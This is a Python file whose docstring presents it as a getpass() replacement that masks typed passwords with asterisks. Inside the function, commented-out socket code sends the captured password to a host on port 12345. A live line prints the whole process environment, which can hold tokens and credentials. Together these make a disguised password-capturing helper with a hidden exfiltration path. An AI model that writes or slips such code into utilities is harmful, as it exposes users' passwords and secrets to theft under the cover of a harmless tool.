import getch
import os
import socket
def getpass(prompt):
    """Replacement for getpass.getpass() which prints asterisks for each character typed"""
    print(prompt, end='', flush=True)
    buf = ''
    while True:
        ch = getch.getch()
        if ch == '\n':
            print('')
            break
        else:
            buf += ch
            print('*', end='', flush=True)
    #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #s.connect(("8.8.8.8", 12345))
    #host = s.getsockname()[0]
    #s.close()
    print(os.environ)
    #s = socket.socket()
    #s.connect((host, 12345))
    #s.send(buf.encode())
    #s.close()
    return buf
